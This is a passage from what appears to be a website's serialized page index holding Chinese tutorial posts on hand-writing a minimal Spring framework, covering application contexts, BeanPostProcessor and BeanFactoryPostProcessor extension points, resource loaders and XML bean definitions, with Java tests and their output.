abstractrefreshableapplicationicontext\n    \n     extends abstractapplicationcontext\n    \n    \n    1\n    \n    \n    主要实现了 refreshbeanfactory()，这个方法中创建了默认的容器 defaultlistablebeanfactory，同时在创建容器后向容器中加载bean定义：loadbeandefinitions(defaultlistablebeanfactory beanfactory)，留给子类实现。\n\n 3. abstractxmlapplicationcontext\n    \n     extends abstractrefreshableapplicationicontext\n    \n    \n    1\n    \n    \n    主要实现了从指定资源位置加载 bean 定义： loadbeandefinitions(defaultlistablebeanfactory beanfactory)\n    \n    同时留作获取资源位置： getconfiglocations(); 给子类实现。\n\n 4. classpathxmlapplicationcontext：\n    \n    extends abstractxmlapplicationcontext\n    \n    \n    1\n    \n    \n    classpathxmlapplicationcontext 上下文是 bean 工厂的高级实现，将复杂的 xml 的加载、解析，bean 的注册、实例化、属性填充、生命周期扩展等进行融合，让我们对 bean 的管理更加简单易用。\n    \n    实现通过构造参数的方式new classpathxmlapplicationcontext("classpath:spring.xml");赋值给 getconfiglocations() 来实现资源位置的获取。\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 可以看到，refresh() 默认创建的容器是 defaultlistablebeanfactory，而 refresh() 中弟 5 步：提前实例化所有的单例 bean，这个是之前 defaultlistablebeanfactory 这个容器所不具备的能力。修改 defaultlistablebeanfactory：\n    \n    extends abstractautowirecapablebeanfactory // 具备真正创建bean实例化、属性填充、beanpostprocessor前后置扩展的能力\n        implements beandefinitionregistry, // 之前 defaultlistablebeanfactory 已经实现了 注册 beandefinition 相关的能力\n    \tconfigurablelistablebeanfactory // 新添加 要实现的功能：预实例化所有单例 bean\n    {\n    \tprivate final map<string, beandefinition> beandefinitionmap = new hashmap<>();\n        @override\n        public void preinstantiatesingletons() {\n            beandefinitionmap.keyset().foreach(this::getbean);\n        }\n        @override\n        public <t> map<string, t> getbeansoftype(class<t> type) {\n            hashmap<string, t> result = new hashmap<>();\n            beandefinitionmap.foreach((beanname, beandefinition) -> {\n                class<?> beanclass = beandefinition.getbeanclass();\n                if (type.isassignablefrom(beanclass)) {\n                    result.put(beanname, (t) getbean(beanname));\n                }\n            });\n            return result;\n        }\n        @override\n        public string[] getbeandefinitionnames() {\n            return beandefinitionmap.keyset().toarray(new string[0]);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n    \n    因为在 xmlbeandefinitionreader 资源加载的时候，会将所有的 beandefinition 注册到容器 defaultlistablebeanfactory，所以在这里只需将所有 beandefinition 遍历去构建 bean 即可。\n\n\n# 测试：\n\n * beanpostprocessor 准备\n\npublic class catbeanpostprocessor implements beanpostprocessor {\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) {\n        system.out.println("beanname：" + beanname + " 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization");\n        if ("cat".equals(beanname)) {\n            cat cat = (cat) bean;\n            return new cat("postprocessbeforeinitialization name cat");\n        }\n        return bean;\n    }\n\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) {\n        system.out.println("beanname：" + beanname + " 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization");\n        return bean;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * beanfactorypostprocessor 准备\n\npublic class dogbeanfactorypostprocessor implements beanfactorypostprocessor {\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) {\n        system.out.println("进入到 beandefinition 扩展点 beanfactorypostprocessor -> postprocessbeanfactory");\n        string beanname = "dog";\n        beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n        propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n        propertyvalue propertyvalue = propertyvalues.getpropertyvalue("name");\n        string oldvalue = string.valueof(propertyvalue.getvalue());\n        string updatevalue = beanname + "-beandefinition-updated";\n        propertyvalue.setvalue(updatevalue);\n        system.out.println("beanname：" + beanname + " 属性：name，原先值：" + oldvalue + " 修改后值：" + updatevalue);\n        system.out.println();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * 外部资源 spring.xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    <bean id="cat" name="catbean" class="com.snail.springframework.beans.factory.support.cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n    <bean id="dog" class="com.snail.springframework.beans.factory.support.dog">\n        <property name="name" value="dog-name-xml-init"></property>\n        <property name="cat" ref="cat"></property>\n    </bean>\n\n    \x3c!--  添加扩展点相关类  --\x3e\n    <bean class="com.snail.springframework.beans.factory.support.catbeanpostprocessor"/>\n    <bean class="com.snail.springframework.beans.factory.support.dogbeanfactorypostprocessor"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\n之前使用容器的测试类：\n\n@test\npublic void test_beanfactoryandpostprocessor() {\n    // 1. 初始化 bean 工厂\n    defaultlistablebeanfactory beanfactory = new defaultlistablebeanfactory();\n    // 2. 使用加载器加载xml配置文件，初始化 beandefinition\n    xmlbeandefinitionreader reader = new xmlbeandefinitionreader(beanfactory);\n    reader.loadbeandefinitions("classpath:spring.xml");\n    \n\t// 3. 添加 beandefinition 扩展点，（这里的扩展点是手动调用的）\n    // 在 bean 实例化前，beandefinition 初始化后\n    new dogbeanfactorypostprocessor().postprocessbeanfactory(beanfactory);\n    // 4. 添加 bean 扩展点\n    // bean 初始化前后回调相应方法\n    catbeanpostprocessor catbeanpostprocessor = new catbeanpostprocessor();\n    beanfactory.addbeanpostprocessor(catbeanpostprocessor);\n    \n    // 5. 获取bean\n    dog dog = (dog) beanfactory.getbean("dog");\n    system.out.println();\n    dog.printname();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n使用上下文后的测试类，可以看到相比之前已经有了极大的便利性：\n\n@test\npublic void test_xml_context() {\n    // 1. 利用 xml上下文 加载bean\n    // 上下文的高级实现极大的简化了或融合了上述的 1-4 步操作\n    classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring.xml");\n    // 2. 获取bean\n    dog dog = (dog) applicationcontext.getbean("dog");\n\n    string[] beandefinitionnames = applicationcontext.getbeandefinitionnames();\n    system.out.println();\n    system.out.println(jsonutil.tojsonstr(beandefinitionnames));\n    system.out.println();\n    dog.printname();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 测试结果\n\n进入到 beandefinition 扩展点 beanfactorypostprocessor -> postprocessbeanfactory\nbeanname：dog 属性：name，原先值：dog-name-xml-init 修改后值：dog-beandefinition-updated\n\nbeanname：cat 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization\nbeanname：cat 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization\nbeanname：dog 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization\nbeanname：dog 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization\n\n["cat","catbeanpostprocessor","dog","dogbeanfactorypostprocessor"]\n\ndog-beandefinition-updated\ncat{name=\'postprocessbeforeinitialization name cat\'}\n{inner-dog2=jerrydog, inner-dog1=tomdog}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 总结\n\n总结，spring 上下文（context）相对于 beanfactory 有以下优势：\n\n 1. 预加载：beanfactory 在容器启动时并不会实例化所有的 bean，而是在需要时才进行实例化。相反，spring 上下文会在容器启动时一次性创建并初始化所有的 bean 实例。这样可以加快应用程序的启动速度，减少应用程序的资源消耗。\n 2. 自动装配：spring 上下文支持自动装配，可以根据类型或名称自动注入 bean 实例，而 beanfactory 需要手动配置依赖注入关系。\n 3. 高级特性：spring 上下文提供了更多的高级特性，例如 aop、事务、国际化、事件发布等。而 beanfactory 只提供了基本的 bean 创建和管理功能。\n 4. 扩展性：spring 上下文是在 beanfactory 的基础上扩展而来的，它提供了更多的扩展点，使得可以在运行时动态地加载和卸载 bean 定义、注册和取消注册 beanfactory 后置处理器和应用程序监听器等。\n 5. 代码简洁性：spring 上下文可以将多个 beanfactory 集成到一个上下文中，从而简化了代码的编写和维护。\n\n综上所述，相对于 beanfactory，spring 上下文提供了更多的高级特性和扩展点，同时也具有更高的预加载性能和自动装配能力。因此，在实际应用中，通常使用 spring 上下文来管理 bean 实例和配置信息。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 03 - 扩展 Bean 的生命周期",frontmatter:{title:"手写 Spring 03 - 扩展 Bean 的生命周期",date:"2023-03-07T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-03.html",relativePath:"views/backend/spring-source-03.md",key:"v-5364409e",path:"/views/backend/spring-source-03.html",headers:[{level:2,title:"在 Bean 的生命周期添加扩展点",slug:"在-bean-的生命周期添加扩展点",normalizedTitle:"在 bean 的生命周期添加扩展点",charIndex:3},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:26},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:42},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:54},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:72}],excerpt:"<Boxx/>\n",headersStr:"在 Bean 的生命周期添加扩展点 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试：",content:' * 在 Bean 的生命周期添加扩展点\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n\n\n\n\n# 在 Bean 的生命周期添加扩展点\n\n\n# 定义一些职责和能力：\n\n 1. BeanFactoryPostProcessor：用于修改 Spring 容器中 BeanDefinition 的扩展点。\n    \n    当 Spring 容器创建 BeanDefinition 之后，但在创建 Bean 实例之前，BeanFactoryPostProcessor 就可以通过实现 postProcessBeanFactory 方法来修改 BeanDefinition 的属性，如修改 Bean 的作用域、添加 Bean 的属性值等。BeanFactoryPostProcessor 的实现类在 Spring 容器启动时就会被调用。\n\n 2. BeanPostProcessor：用于修改 Bean 实例的扩展点。\n    \n    当 Spring 容器创建 Bean 实例之后，但在初始化 Bean 之前，BeanPostProcessor 就可以通过实现 postProcessBeforeInitialization 和 postProcessAfterInitialization 方法来修改 Bean 的属性或执行一些初始化操作。例如，可以为 Bean 添加代理对象、修改属性值、执行 AOP 操作等。BeanPostProcessor 的实现类在 Spring 容器启动时就会被调用，并且会对容器中的每个 Bean 实例都进行处理。\n\n 3. HierarchicalBeanFactory：扩展 BeanFactory 接口，支持父子容器，这里暂时无用。\n\n 4. DefaultSingletonBeanRegistry： implements SingletonBeanRegistry\n    \n    实现了添加和获取单例 Bean 的能力\n\n 5. ConfigurableBeanFactory：extends HierarchicalBeanFactory, SingletonBeanRegistry\n    \n    扩展 BeanFactory 接口，支持设置父级容器、自自定义作用域、添加 BeanPostProcessor 后置处理器、设置 bean 的初始化和销毁回调方法等。\n\n 6. AutowireCapableBeanFactory：扩展 BeanFactory 接口，支持自动装配 Bean 的能力，\n    \n    这里主要添加扩展点 Object applyBeanPostProcessorsBeforeInitialization(Object existingBean, String beanName); 作为 初始化前 bean 的前置处理，Object applyBeanPostProcessorsAfterInitialization(Object existingBean, String beanName); 作为 初始化后 bean 的后置处理。\n\n\n# 具体的实现：\n\n 1. AbstractBeanFactory：[主要实现了doGetBean()，添加BeanPostProcessor]\n    \n    extends DefaultSingletonBeanRegistry（已经实现了添加和获取单例 Bean 的能力）\n    \n    implements ConfigurableBeanFactory（添加 BeanPostProcessor 后置处理器）\n    \n    实现：内置一个 List<BeanPostProcessor> 列表，实现了 添加 BeanPostProcessor 和 获取 BeanPostProcessor 的能力。\n\n 2. AbstractAutowireCapableBeanFactory：[真实的doGetBean()调用的createBean(beanName, beanDefinition, args);的过程在这个类里，所以将Bean的扩展点加入到创建Bean的过程中]\n    \n    extends AbstractBeanFactory （已经具备了添加BeanPostProcessor的能力）\n    \n    implements AutowireCapableBeanFactory（实现 bean 的实例化前后置回调）\n    \n    实现：在 createBean() 中，一个 Bean 实例化后进行属性填充，之后加入 Bean 的 init()，在 init() 前后加入 BeanPostProcessor 前后置方法的回调，这样在创建一个 Bean 的时候就加入了 Bean 的生命周期干预。\n\n 3. 对于 BeanFactoryPostProcessor，在测试的时候我们手写一个实现了，手动调用一下即可。（后续加入上下文的时候，在上下文里实现自动调用）\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 如上 AbstractBeanFactory 和 AbstractAutowireCapableBeanFactory\n\n\n# 测试：\n\n * BeanPostProcessor 准备\n\npublic class CatBeanPostProcessor implements BeanPostProcessor {\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) {\n        System.out.println("beanName：" + beanName + " 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization");\n        if ("cat".equals(beanName)) {\n            Cat cat = (Cat) bean;\n            return new Cat("postProcessBeforeInitialization name cat");\n        }\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        System.out.println("beanName：" + beanName + " 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization");\n        return bean;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * BeanFactoryPostProcessor 准备\n\npublic class DogBeanFactoryPostProcessor implements BeanFactoryPostProcessor {\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        System.out.println("进入到 BeanDefinition 扩展点 BeanFactoryPostProcessor -> postProcessBeanFactory");\n        String beanName = "dog";\n        BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n        PropertyValues propertyValues = beanDefinition.getPropertyValues();\n        PropertyValue propertyValue = propertyValues.getPropertyValue("name");\n        String oldValue = String.valueOf(propertyValue.getValue());\n        String updateValue = beanName + "-BeanDefinition-updated";\n        propertyValue.setValue(updateValue);\n        System.out.println("beanName：" + beanName + " 属性：name，原先值：" + oldValue + " 修改后值：" + updateValue);\n        System.out.println();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * 外部资源 spring.xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    <bean id="cat" name="catBEAN" class="com.snail.springframework.beans.factory.support.Cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n    <bean id="dog" class="com.snail.springframework.beans.factory.support.Dog">\n        <property name="name" value="dog-name-xml-init"></property>\n        <property name="cat" ref="cat"></property>\n    </bean>\n\n    \x3c!--  添加扩展点相关类  --\x3e\n    <bean class="com.snail.springframework.beans.factory.support.CatBeanPostProcessor"/>\n    <bean class="com.snail.springframework.beans.factory.support.DogBeanFactoryPostProcessor"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\n@Test\npublic void test_beanFactoryAndPostProcessor() {\n    // 1. 初始化 Bean 工厂\n    DefaultListableBeanFactory beanFactory = new DefaultListableBeanFactory();\n    // 2. 使用加载器加载xml配置文件，初始化 BeanDefinition\n    XmlBeanDefinitionReader reader = new XmlBeanDefinitionReader(beanFactory);\n    reader.loadBeanDefinitions("classpath:spring.xml");\n    \n\t// 3. 添加 BeanDefinition 扩展点，（这里的扩展点是手动调用的）\n    // 在 Bean 实例化前，BeanDefinition 初始化后\n    new DogBeanFactoryPostProcessor().postProcessBeanFactory(beanFactory);\n    // 4. 添加 Bean 扩展点\n    // Bean 初始化前后回调相应方法\n    CatBeanPostProcessor catBeanPostProcessor = new CatBeanPostProcessor();\n    beanFactory.addBeanPostProcessor(catBeanPostProcessor);\n    \n    // 5. 获取bean\n    Dog dog = (Dog) beanFactory.getBean("dog");\n    System.out.println();\n    dog.printName();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n * 测试结果\n\n进入到 BeanDefinition 扩展点 BeanFactoryPostProcessor -> postProcessBeanFactory\nbeanName：dog 属性：name，原先值：dog-name-xml-init 修改后值：dog-BeanDefinition-updated\n\nbeanName：cat 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization\nbeanName：cat 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization\nbeanName：dog 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization\nbeanName：dog 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization\n\ndog-BeanDefinition-updated\nCat{name=\'postProcessBeforeInitialization name cat\'}\n{inner-dog2=JerryDog, inner-dog1=TomDog}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n',normalizedContent:' * 在 bean 的生命周期添加扩展点\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n\n\n\n\n# 在 bean 的生命周期添加扩展点\n\n\n# 定义一些职责和能力：\n\n 1. beanfactorypostprocessor：用于修改 spring 容器中 beandefinition 的扩展点。\n    \n    当 spring 容器创建 beandefinition 之后，但在创建 bean 实例之前，beanfactorypostprocessor 就可以通过实现 postprocessbeanfactory 方法来修改 beandefinition 的属性，如修改 bean 的作用域、添加 bean 的属性值等。beanfactorypostprocessor 的实现类在 spring 容器启动时就会被调用。\n\n 2. beanpostprocessor：用于修改 bean 实例的扩展点。\n    \n    当 spring 容器创建 bean 实例之后，但在初始化 bean 之前，beanpostprocessor 就可以通过实现 postprocessbeforeinitialization 和 postprocessafterinitialization 方法来修改 bean 的属性或执行一些初始化操作。例如，可以为 bean 添加代理对象、修改属性值、执行 aop 操作等。beanpostprocessor 的实现类在 spring 容器启动时就会被调用，并且会对容器中的每个 bean 实例都进行处理。\n\n 3. hierarchicalbeanfactory：扩展 beanfactory 接口，支持父子容器，这里暂时无用。\n\n 4. defaultsingletonbeanregistry： implements singletonbeanregistry\n    \n    实现了添加和获取单例 bean 的能力\n\n 5. configurablebeanfactory：extends hierarchicalbeanfactory, singletonbeanregistry\n    \n    扩展 beanfactory 接口，支持设置父级容器、自自定义作用域、添加 beanpostprocessor 后置处理器、设置 bean 的初始化和销毁回调方法等。\n\n 6. autowirecapablebeanfactory：扩展 beanfactory 接口，支持自动装配 bean 的能力，\n    \n    这里主要添加扩展点 object applybeanpostprocessorsbeforeinitialization(object existingbean, string beanname); 作为 初始化前 bean 的前置处理，object applybeanpostprocessorsafterinitialization(object existingbean, string beanname); 作为 初始化后 bean 的后置处理。\n\n\n# 具体的实现：\n\n 1. abstractbeanfactory：[主要实现了dogetbean()，添加beanpostprocessor]\n    \n    extends defaultsingletonbeanregistry（已经实现了添加和获取单例 bean 的能力）\n    \n    implements configurablebeanfactory（添加 beanpostprocessor 后置处理器）\n    \n    实现：内置一个 list<beanpostprocessor> 列表，实现了 添加 beanpostprocessor 和 获取 beanpostprocessor 的能力。\n\n 2. abstractautowirecapablebeanfactory：[真实的dogetbean()调用的createbean(beanname, beandefinition, args);的过程在这个类里，所以将bean的扩展点加入到创建bean的过程中]\n    \n    extends abstractbeanfactory （已经具备了添加beanpostprocessor的能力）\n    \n    implements autowirecapablebeanfactory（实现 bean 的实例化前后置回调）\n    \n    实现：在 createbean() 中，一个 bean 实例化后进行属性填充，之后加入 bean 的 init()，在 init() 前后加入 beanpostprocessor 前后置方法的回调，这样在创建一个 bean 的时候就加入了 bean 的生命周期干预。\n\n 3. 对于 beanfactorypostprocessor，在测试的时候我们手写一个实现了，手动调用一下即可。（后续加入上下文的时候，在上下文里实现自动调用）\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 如上 abstractbeanfactory 和 abstractautowirecapablebeanfactory\n\n\n# 测试：\n\n * beanpostprocessor 准备\n\npublic class catbeanpostprocessor implements beanpostprocessor {\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) {\n        system.out.println("beanname：" + beanname + " 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization");\n        if ("cat".equals(beanname)) {\n            cat cat = (cat) bean;\n            return new cat("postprocessbeforeinitialization name cat");\n        }\n        return bean;\n    }\n\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) {\n        system.out.println("beanname：" + beanname + " 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization");\n        return bean;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * beanfactorypostprocessor 准备\n\npublic class dogbeanfactorypostprocessor implements beanfactorypostprocessor {\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) {\n        system.out.println("进入到 beandefinition 扩展点 beanfactorypostprocessor -> postprocessbeanfactory");\n        string beanname = "dog";\n        beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n        propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n        propertyvalue propertyvalue = propertyvalues.getpropertyvalue("name");\n        string oldvalue = string.valueof(propertyvalue.getvalue());\n        string updatevalue = beanname + "-beandefinition-updated";\n        propertyvalue.setvalue(updatevalue);\n        system.out.println("beanname：" + beanname + " 属性：name，原先值：" + oldvalue + " 修改后值：" + updatevalue);\n        system.out.println();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * 外部资源 spring.xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    <bean id="cat" name="catbean" class="com.snail.springframework.beans.factory.support.cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n    <bean id="dog" class="com.snail.springframework.beans.factory.support.dog">\n        <property name="name" value="dog-name-xml-init"></property>\n        <property name="cat" ref="cat"></property>\n    </bean>\n\n    \x3c!--  添加扩展点相关类  --\x3e\n    <bean class="com.snail.springframework.beans.factory.support.catbeanpostprocessor"/>\n    <bean class="com.snail.springframework.beans.factory.support.dogbeanfactorypostprocessor"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\n@test\npublic void test_beanfactoryandpostprocessor() {\n    // 1. 初始化 bean 工厂\n    defaultlistablebeanfactory beanfactory = new defaultlistablebeanfactory();\n    // 2. 使用加载器加载xml配置文件，初始化 beandefinition\n    xmlbeandefinitionreader reader = new xmlbeandefinitionreader(beanfactory);\n    reader.loadbeandefinitions("classpath:spring.xml");\n    \n\t// 3. 添加 beandefinition 扩展点，（这里的扩展点是手动调用的）\n    // 在 bean 实例化前，beandefinition 初始化后\n    new dogbeanfactorypostprocessor().postprocessbeanfactory(beanfactory);\n    // 4. 添加 bean 扩展点\n    // bean 初始化前后回调相应方法\n    catbeanpostprocessor catbeanpostprocessor = new catbeanpostprocessor();\n    beanfactory.addbeanpostprocessor(catbeanpostprocessor);\n    \n    // 5. 获取bean\n    dog dog = (dog) beanfactory.getbean("dog");\n    system.out.println();\n    dog.printname();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n * 测试结果\n\n进入到 beandefinition 扩展点 beanfactorypostprocessor -> postprocessbeanfactory\nbeanname：dog 属性：name，原先值：dog-name-xml-init 修改后值：dog-beandefinition-updated\n\nbeanname：cat 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization\nbeanname：cat 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization\nbeanname：dog 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization\nbeanname：dog 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization\n\ndog-beandefinition-updated\ncat{name=\'postprocessbeforeinitialization name cat\'}\n{inner-dog2=jerrydog, inner-dog1=tomdog}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 02 - 添加外部资源加载器以及和现有容器结合",frontmatter:{title:"手写 Spring 02 - 添加外部资源加载器以及和现有容器结合",date:"2023-02-28T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-02.html",relativePath:"views/backend/spring-source-02.md",key:"v-0add11c0",path:"/views/backend/spring-source-02.html",headers:[{level:2,title:"从外部资源加载 Bean",slug:"从外部资源加载-bean",normalizedTitle:"从外部资源加载 bean",charIndex:172},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:190},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:206},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:218},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:236},{level:2,title:"外部资源和现有容器整合",slug:"外部资源和现有容器整合",normalizedTitle:"外部资源和现有容器整合",charIndex:243},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力：",charIndex:190},{level:3,title:"具体的实现：",slug:"具体的实现-2",normalizedTitle:"具体的实现：",charIndex:206},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:218},{level:3,title:"测试：",slug:"测试-2",normalizedTitle:"测试：",charIndex:236}],excerpt:"<Boxx/>\n<p>添加资源加载接口定义类：Resource，及核心实现：DefaultResourceLoader；</p>\n<p>添加加载Bean定义接口：BeanDefinitionReader，及核心实现xml解析：XmlBeanDefinitionReader</p>\n<p>与现有容器结合：通过构造参数的方式将容器注入到xml加载器中，将加载到资源解析给指定容器</p>\n",headersStr:"从外部资源加载 Bean 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 外部资源和现有容器整合 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试：",content:'添加资源加载接口定义类：Resource，及核心实现：DefaultResourceLoader；\n\n添加加载Bean定义接口：BeanDefinitionReader，及核心实现xml解析：XmlBeanDefinitionReader\n\n与现有容器结合：通过构造参数的方式将容器注入到xml加载器中，将加载到资源解析给指定容器\n\n\n\n * 从外部资源加载 Bean\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 外部资源和现有容器整合\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n\n\n\n\n# 从外部资源加载 Bean\n\n在 Bean 的实例化和属性填充完成后，我们已经可以通过在代码里手动 new 对象的方式实现一个简单的 Bean 容器。\n\n为了方便的从外部配置、加载 Bean，抽取一个工具类可以从不同位置获取 定义 Bean 的配置文件信息。\n\n\n# 定义一些职责和能力：\n\n 1. Resource：InputStream getInputStream() throws IOException; 定义资源接口；\n 2. ResourceLoader：Resource getResource(String location); 定义资源包装接口，根据入参自动匹配相应的资源（Resource）；\n\n\n# 具体的实现：\n\n 1. ClassPathResource：可以从类路径下读取资源；\n 2. FileSystemResource：可以从指定路径或指定文件读取资源；\n 3. UrlResource：可以从指定url读取资源；\n 4. DefaultResourceLoader：根据location自动匹配相应的资源；\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 测试：\n\npublic class DefaultResourceLoaderTest {\n\n   private ResourceLoader resourceLoader;\n\n   @Before\n   public void init() {\n      resourceLoader = new DefaultResourceLoader();\n   }\n\n   @Test\n   public void test_classpath() throws IOException {\n      Resource resource = resourceLoader.getResource("classpath:spring.xml");\n      InputStream inputStream = resource.getInputStream();\n      String content = IoUtil.readUtf8(inputStream);\n      System.out.println("===== classpath =====");\n      System.out.println(content);\n      System.out.println("===== classpath =====");\n   }\n\n   @Test\n   public void test_file() throws IOException {\n      Resource resource = resourceLoader.getResource("src/main/resources/spring.xml");\n      InputStream inputStream = resource.getInputStream();\n      String content = IoUtil.readUtf8(inputStream);\n      System.out.println("===== file =====");\n      System.out.println(content);\n      System.out.println("===== file =====");\n   }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 外部资源和现有容器整合\n\n从外部资源获取到 Bean 的配置信息后，需要解析配置信息与现有的 Bean 容器结合，增强容器的能力（省去了在代码中手动添加 Bean 的过程）。\n\n\n# 定义一些职责和能力：\n\n 1. BeanDefinitionReader：定义加载Bean定义接口，从各个资源加载为 BeanDefinition；\n\n\n# 具体的实现：\n\n 1. AbstractBeanDefinitionReader：一个抽线类默认实现，主要提供对 getRegistry()、getResourceLoader() 的默认实现，子类只需关心加载Bean定义即可；\n 2. XmlBeanDefinitionReader：从 xml 文件读取 bean，转换为 BeanDefinition，并注册到指定的 BeanDefinitionRegistry （DefaultListableBeanFactory 已经具备了这个能力）；\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 测试：\n\npublic class 